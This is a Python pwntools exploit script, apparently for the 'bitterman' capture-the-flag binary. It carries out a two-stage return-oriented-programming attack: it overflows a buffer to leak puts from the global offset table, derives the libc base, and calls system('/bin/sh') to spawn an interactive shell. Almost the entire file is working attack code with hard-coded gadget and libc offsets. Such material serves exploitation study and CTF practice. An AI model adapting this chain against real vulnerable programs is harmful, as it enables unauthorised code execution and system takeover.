#!/usr/bin/python
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                  PYTHON UTILITY SCRIPT FILE FOR ROP EXPLOITATION
#               BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

from pwn import *
p = process('./bitterman')
context(os='linux', arch='amd64')
context.log_level = 'info'

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Stage one.
# Modified: N/A
# -------------------------------------------------------------------------------------

plt_main = p64(0x4006ec)		# objdump -D bitterman | grep main
plt_put  = p64(0x400520)		# objdump -D bitterman | grep puts
got_put  = p64(0x600c50)		# objdump -D bitterman | grep got.puts
pop_rdi  = p64(0x400853)		# ra bitterman /R pop rdi
junk     = "A"*152			# gdb and checksec

payload = junk + pop_rdi + got_put + plt_put + plt_main

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Program specific deployment.
# Modified: N/A
# -------------------------------------------------------------------------------------

p.recvuntil("name?")			# > What's your name? 
p.sendline("spooks7")			# sp00ks7
					# Hi, sp00ks7
					#
p.recvuntil("message:")			# > Please input the length of your message: 
p.sendline("1024")			# 2014
p.recvuntil("text:")			# > Please enter your text: 
p.sendline(payload)			# payload goes here!
p.recvuntil("Thanks!")			# > Thanks!

leaked_puts = p.recv()[:8].strip().ljust(8, '\x00')
log.success("Leaked puts@GLIBC " + str(leaked_puts))
leaked_puts = u64(leaked_puts)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Stage two.
# Modified: N/A
# -------------------------------------------------------------------------------------

libc_put = (0x071910)			# readelf -s rlibc.so.6 | grep puts
libc_sys = (0x0449c0)			# readelf -s rlibc.so.6 | grep system
libc_sh  = (0x181519)			# strings -a -t x rlibc.so.6 | grep /bin/sh

offset   = leaked_puts - libc_put
sys      = p64(offset + libc_sys)
sh       = p64(offset + libc_sh)

payload  = junk + pop_rdi + sh + sys 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Program specific deployment.
# Modified: N/A
# -------------------------------------------------------------------------------------

p.sendline("spooks7")			# spooks7
					# Hi, sp00ks7
					#
p.recvuntil("message:")			# > Please input the length of your message: 
p.sendline("1024")			# 2014
p.recvuntil("text:")			# > Please enter your text: 
p.sendline(payload)			# Send payload here

success("PWNED!!")
p.interactive()










